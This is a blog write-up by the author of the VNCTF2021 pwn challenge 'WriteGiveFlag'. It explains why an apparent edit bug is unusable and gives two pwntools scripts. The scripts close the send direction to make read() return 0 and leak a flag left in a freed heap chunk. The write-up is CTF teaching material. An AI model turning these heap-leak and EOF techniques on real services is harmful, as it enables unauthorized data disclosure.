---
layout: post
title:  "VNCTF2021-WriteGiveFlag"
date:   2021-3-17
desc: ""
keywords: ""
categories: [Binary]
tags: []
icon: icon-html
---
# VNCTF2021-WriteGiveFlag
[X-NUCA2020 Final](https://aidaip.github.io/life/2020/12/16/X-NUCA-Final-WriteUp.html) 有一道 AWD-CryptoPwn（lemon），用到了 `read()` 返回 0 泄露数据，👴🚪都是龙鸣，比赛现场没一个人想起来 `shutdown()`，手动 ctrl+d ☀全场打了一下午。

赛后查 [pwntools 文档](https://docs.pwntools.com/en/stable/tubes.html?highlight=EOF#pwnlib.tubes.tube.tube.shutdown)，👴是弱智

shutdown(direction = "send")

Closes the tube for futher reading or writing depending on direction.

* Parameters: direction (str) – Which direction to close; “in”, “read” or “recv” closes the tube in the ingoing direction, “out”, “write” or “send” closes it in the outgoing direction.
* Returns: None

```python
>>> def p(x): print(x)
>>> t = tube()
>>> t.shutdown_raw = p
>>> _=list(map(t.shutdown, ('in', 'read', 'recv', 'out', 'write', 'send')))
recv
recv
recv
send
send
send
>>> t.shutdown('bad_value') #doctest: +ELLIPSIS
Traceback (most recent call last):
...
KeyError: "direction must be in ['in', 'out', 'read', 'recv', 'send', 'write']"
```

shutdown_raw(direction)
Should not be called directly. Closes the tube for further reading or writing.

给 VNCTF2021 出 Pwn 签到题的时候想到了这个，就出了道直接打印 flag 的签到题。



# 0x01

比赛结束时，这题比 hh 解出来的人还要少，👴感觉可能是各位👴不屑于做👴的垃圾题。

比赛时感觉有点僵硬，很多人在 QQ 上问问题，👴感觉可能是带🔥太长时间没做过 flag 直接白给的题目了，拿到题目就想着 leak、hijack、getshell（getflag），但这道题👴🚪可以直接快进到 getflag。

不给 libc 的出题人是阴间出题人（housebuilding：👴看到不给 libc 的题目直接不做），但这道题👴不放 libc 是因为用不到。

在题目的 edit 功能中，看上去显然是有问题的：

```c
void edit(){
    puts("index:");
    int index;
    index = read_index();
    if(index<0 || index>MAX || !heap_store[index])
        exit(0);
    puts("Content:");
    read_str(heap_store[index],(int)*(heap_store[index]-0x8)-0x11);
    puts("Done!");
    return;
}
```

这里对 index 的检查写的是 `index>MAX`，导致 index 可以为 4，也就是选中 `msg_ptr[0]`

read size 用了一种非常弱智的写法，显然会出现负数（例如 add size 0xf0 使 chunk size 为 0x101）

```c
*RDX  0xfffffffffffffff0
 RDI  0x0
*RSI  0x8404200 ◂— 0x0
pwndbg> x/10gx 0x8404200-0x10
0x84041f0:      0x0000000000000000      0x0000000000000101
0x8404200:      0x0000000000000000      0x0000000000000000
0x8404210:      0x0000000000000000      0x0000000000000000
0x8404220:      0x0000000000000000      0x0000000000000000
0x8404230:      0x0000000000000000      0x0000000000000000
 ► 0x7fffff11014f <read+15>    syscall  <SYS_read>
        fd: 0x0
        buf: 0x8404200 ◂— 0x0
        nbytes: 0xfffffffffffffff0
```

看上去能 read 0xfffffffffffffff0 导致越界写，但是不好使

> If countis greater than SSIZE_MAX, the result is unspecified.

```
.. SPDX-License-Identifier: GPL-2.0 OR GFDL-1.1-no-invariants-or-later
.. c:namespace:: RC

.. _lirc-read:

***********
LIRC read()
***********

Name
====

lirc-read - Read from a LIRC device

Synopsis
========

.. code-block:: c

    #include <unistd.h>

.. c:function:: ssize_t read( int fd, void *buf, size_t count )

Arguments
=========

``fd``
    File descriptor returned by ``open()``.

``buf``
   Buffer to be filled

``count``
   Max number of bytes to read

Description
===========

:c:func:`read()` attempts to read up to ``count`` bytes from file
descriptor ``fd`` into the buffer starting at ``buf``.  If ``count`` is zero,
:c:func:`read()` returns zero and has no other results. If ``count``
is greater than ``SSIZE_MAX``, the result is unspecified.

The exact format of the data depends on what :ref:`lirc_modes` a driver
uses. Use :ref:`lirc_get_features` to get the supported mode, and use
:ref:`lirc_set_rec_mode` set the current active mode.

The mode :ref:`LIRC_MODE_MODE2 <lirc-mode-mode2>` is for raw IR,
in which packets containing an unsigned int value describing an IR signal are
read from the chardev.

Alternatively, :ref:`LIRC_MODE_SCANCODE <lirc-mode-scancode>` can be available,
in this mode scancodes which are either decoded by software decoders, or
by hardware decoders. The :c:type:`rc_proto` member is set to the
:ref:`IR protocol <Remote_controllers_Protocols>`
used for transmission, and ``scancode`` to the decoded scancode,
and the ``keycode`` set to the keycode or ``KEY_RESERVED``.

Return Value
============

On success, the number of bytes read is returned. It is not an error if
this number is smaller than the number of bytes requested, or the amount
of data required for one frame.  On error, -1 is returned, and the ``errno``
variable is set appropriately.

```



SYS_read

```c
fs\read_write.c
SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)
{
	return ksys_read(fd, buf, count);
}c
```

ksys_read

```c
ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)
{
	struct fd f = fdget_pos(fd);
	ssize_t ret = -EBADF;

	if (f.file) {
		loff_t pos, *ppos = file_ppos(f.file);
		if (ppos) {
			pos = *ppos;
			ppos = &pos;
		}
		ret = vfs_read(f.file, buf, count, ppos);
		if (ret >= 0 && ppos)
			f.file->f_pos = pos;
		fdput_pos(f);
	}
	return ret;
}

```

vfs_read

```c
ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
{
	ssize_t ret;

	if (!(file->f_mode & FMODE_READ))
		return -EBADF;
	if (!(file->f_mode & FMODE_CAN_READ))
		return -EINVAL;
	if (unlikely(!access_ok(buf, count)))
		return -EFAULT;

	ret = rw_verify_area(READ, file, pos, count);
	if (ret)
		return ret;
	if (count > MAX_RW_COUNT)
		count =  MAX_RW_COUNT;

	if (file->f_op->read)
		ret = file->f_op->read(file, buf, count, pos);
	else if (file->f_op->read_iter)
		ret = new_sync_read(file, buf, count, pos);
	else
		ret = -EINVAL;
	if (ret > 0) {
		fsnotify_access(file);
		add_rchar(current, ret);
	}
	inc_syscr(current);
	return ret;
}
```

rw_verify_area

```c
int rw_verify_area(int read_write, struct file *file, const loff_t *ppos, size_t count)
{
	struct inode *inode;
	int retval = -EINVAL;

	inode = file_inode(file);
	if (unlikely((ssize_t) count < 0))
		return retval;

	/*
	 * ranged mandatory locking does not apply to streams - it makes sense
	 * only for files where position has a meaning.
	 */
	if (ppos) {
		loff_t pos = *ppos;

		if (unlikely(pos < 0)) {
			if (!unsigned_offsets(file))
				return retval;
			if (count >= -pos) /* both values are in 0..LLONG_MAX */
				return -EOVERFLOW;
		} else if (unlikely((loff_t) (pos + count) < 0)) {
			if (!unsigned_offsets(file))
				return retval;
		}

		if (unlikely(inode->i_flctx && mandatory_lock(inode))) {
			retval = locks_mandatory_area(inode, file, pos, pos + count - 1,
					read_write == READ ? F_RDLCK : F_WRLCK);
			if (retval < 0)
				return retval;
		}
	}

	return security_file_permission(file,
				read_write == READ ? MAY_READ : MAY_WRITE);
}
```

`(ssize_t) count` 应大于 0

`(size_t)count` 为 0xfffffffffffffff0 时，`(ssize_t) count` 为 -16

```c
//gcc test.c -o test
#include<stdio.h>
#include<unistd.h>
#define unlikely(x) __builtin_expect(!!(x), 0)
int main(int argc, char const *argv[])
{
	size_t count = 0xfffffffffffffff0;
	char a[0x100];
	int ret = read(0,a,count);
	printf("reat ret:%d\n",ret);
	printf("(ssize_t)count:%ld\n",(ssize_t)count );
	if (unlikely((ssize_t)count < 0))
		printf("fuck\n");
	return 0;
}
```

```
reat ret:-1
(ssize_t)count:-16
fuck
```

所以精心构造一个 chunk size 不好使，同理 edit 4 也不好使。

```c
*RDX  0xffffffffffffffef
 RDI  0x0
*RSI  0x8202020 ◂— 'There is no vuln in add'
► 0x7fffff11014f <read+15>    syscall  <SYS_read>
        fd: 0x0
        buf: 0x8202020 ◂— 'There is no vuln in add'
        nbytes: 0xffffffffffffffef
```

edit 无法利用，如果魔改一波使 edit 可以利用，那就得到了另一道签到题，解法也很清晰：

edit 4 越界，改一波指针，在菜单 leak 数据，顺便整丶堆风水，tcache attack 打一波 setcontext  或者 environ leak 日栈，接 rop（不是寄存器）orw（这个不应该忘） 读 flag（不是 getshell，因为程序里面有个什么东西阻挡了 getshell）。（括号内容致敬 315 CTF 打假）

可惜用⑧得，👴🚪做题的时候不仅💊找漏洞，还要判断能⑧能用。

比赛时一个老哥要 hint 要了一天，最后喷👴：

> 辣鸡题，啥都不考
>
> 浪费我时间，啥都没学到

他说他会做了，没啥意义，不做了：

> 用下标为 4 进行 edit，泄露 heap，再改写数组

👴发现他指针都能看歪，和他扯了一小时二十分钟，他才发现解法不可行：

> 那该怎么做
>
> 👴：你不是会做吗
>
> 不会做

👴还以为他 flag 都交了

拿到题看到这个弱智一样的菜单（读取菜单选项的函数返回的是 `read()` 的返回值而不是 `atoi()` 的返回值），就应该打个 EOF 试试，看见有输出就应该有丶想法了。

但是如果看见输出一激动，开始思考如何泄露地址，那就有丶僵硬了。

## WriteUp

白给 flag，sub_B1A 中 malloc 随机 size 若干次，把 flag 写进去，最后一次执行时没有清空已 free 的 chunk，flag 还在里面，所以是白给 flag。

qword_202120 有五个字符串，与菜单中的选项对应，show 和 delete 确实没用。

```
"There is no vuln in add";
"There is no vuln in edit";
"There is no vuln in show and it is useless";
"There is no vuln in delete and it is useless";
```

读取菜单选项的函数返回的是 `read()` 的返回值而不是 `atoi()` 的返回值，根据返回值打印 qword_202120 中的字符串。qword_202120 上方是堆指针，qword_202120[-1] 就是 chunk[3]。

malloc 随机 size 写 flag 时，size 的范围是 [0x300, 0x500]。add 到 chunk[3] 时申请一个在范围内的 size，如果恰好是带有 flag 的 chunk size，就可以把这个 chunk 取出来，然后 edit 填充 0x10 个字符，`puts(qword_202120[-1])` 就能打印出 flag。size 范围不大，可以爆破。

`puts(qword_202120[-1])`  需要使 `read()` 返回 0，也就是读到 EOF。

可以 ctrl+d，虽然需要爆破，但是纯手动操作理论上可行（不建议使用）。

pwntools 可以使用 `shutdown_raw('send')` 关闭管道的 send 方向，使远程 `read()` 读到 EOF，返回 0。exp 如下：

```python
from pwn import *
def menu(choice):
    r.recvuntil('choice:')
    r.sendline(choice)

def add(size):
    menu('')
    r.recvuntil('size:\n')
    r.sendline(str(size))

def edit(index,data):
    menu('111')
    r.recvuntil('index:\n')
    r.sendline(str(index))
    r.recvuntil('Content:\n')
    r.send(data)

def delete(index):
    menu('11')
    r.recvuntil('index:\n')
    r.sendline(str(index))

def show(index):
    menu('1')

while True:
    r = process('./pwn')
    add(0x10)
    add(0x10)
    add(0x10)
    add(0x310)
    edit(3,'x'*0x10)
    r.recvuntil('choice:')
    r.shutdown_raw('send')
    flag = r.recvline()
    log.info(flag)
    if 'vnctf{' in flag or '}' in flag:
        exit(0)
    r.close()
    sleep(1)
```



## 更好的解法

malloc 随机 size 写 flag 时，size 的范围是 [0x300, 0x500]，带有 flag 的 chunk size 可能不在 tcache size 范围内，被 free 后，下一 chunk 是 top chunk，和 top chunk 合并。

申请一个 size 较小的 chunk，切割 top chunk，flag 就在其中。

需要解决的问题是，使用 add 填充 qword_202120[0]、qword_202120[1]、qword_202120[2]，又不使用 top chunk。add 到 qword_202120[3] 时才切割 top chunk。

由于 add 对 size 没有限制，容易想到解决方法是先申请 3 个巨大的 size。

```c
glibc-2.31\glibc-2.31\malloc\malloc.c
      /*
         Otherwise, relay to handle system-dependent cases
       */
      else
        {
          void *p = sysmalloc (nb, av);
          if (p != NULL)
            alloc_perturb (p, bytes);
          return p;
        }
```

malloc 时，如果 heap 不够用，最后会调用 `sysmalloc()` 扩展内存。之后再 malloc 较小 size 时，仍然可以切割 top chunk。

由此可以写出 exp

```python
from pwn import *
def menu(choice):
    r.recvuntil('choice:')
    r.sendline(choice)

def add(size):
    menu('')
    r.recvuntil('size:\n')
    r.sendline(str(size))

def edit(index,data):
    menu('111')
    r.recvuntil('index:\n')
    r.sendline(str(index))
    r.recvuntil('Content:\n')
    r.send(data)

def delete(index):
    menu('11')
    r.recvuntil('index:\n')
    r.sendline(str(index))

def show(index):
    menu('1')

while True:
    r = process('./pwn')
    add(0x200000)
    add(0x200000)
    add(0x200000)
    pause()
    add(0x40)
    edit(3,'x'*0x10)
    r.recvuntil('choice:')
    r.shutdown_raw('send')
    flag = r.recvline()
    log.info(flag)
    if 'vnctf{' in flag or '}' in flag:
        exit(0)
    r.close()
    sleep(1)
```

只要 flag chunk size 不在 tcache size 范围内即可出 flag，概率比恰好与 flag chunk size 相同大的多。

三万👴说卡时间戳本地跑 size 概率能到 100%，👴嫌麻烦。